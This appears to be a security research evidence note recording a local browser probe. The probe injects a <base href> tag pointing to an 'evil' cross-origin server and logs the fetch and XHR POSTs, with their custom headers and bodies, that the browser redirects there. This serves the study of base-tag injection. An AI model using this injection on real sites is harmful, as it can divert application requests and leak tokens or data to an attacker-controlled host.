# Evidence - browser base href request resolution

Date: 2026-04-28

Command:

```bash
node /tmp/xsrf_base_probe.js
```

Probe:

```html
<base href="http://127.0.0.1:8123/evil/">
<script>
  fetch('api', {method:'POST', headers:{'X-Test':'fetch'}});
  fetch('/root-api', {method:'POST', headers:{'X-Test':'fetch-root'}});
  const x = new XMLHttpRequest();
  x.open('POST', 'xhr');
  x.setRequestHeader('X-Test', 'xhr');
  x.send('body');
  const y = new XMLHttpRequest();
  y.open('POST', '/root-xhr');
  y.setRequestHeader('X-Test', 'xhr-root');
  y.send('root-body');
</script>
```

Observed by the cross-origin base server:

```json
[
  {"method":"OPTIONS","url":"/evil/api","origin":"http://127.0.0.1:8124","acrh":"x-test"},
  {"method":"OPTIONS","url":"/root-api","origin":"http://127.0.0.1:8124","acrh":"x-test"},
  {"method":"OPTIONS","url":"/evil/xhr","origin":"http://127.0.0.1:8124","acrh":"x-test"},
  {"method":"POST","url":"/evil/api","origin":"http://127.0.0.1:8124","xtest":"fetch"},
  {"method":"OPTIONS","url":"/root-xhr","origin":"http://127.0.0.1:8124","acrh":"x-test"},
  {"method":"POST","url":"/evil/xhr","origin":"http://127.0.0.1:8124","xtest":"xhr","body":"body"},
  {"method":"POST","url":"/root-api","origin":"http://127.0.0.1:8124","xtest":"fetch-root"},
  {"method":"POST","url":"/root-xhr","origin":"http://127.0.0.1:8124","xtest":"xhr-root","body":"root-body"}
]
```

Conclusion: Chrome resolves both relative and root-relative Fetch/XHR request URLs against the
document base URL origin.

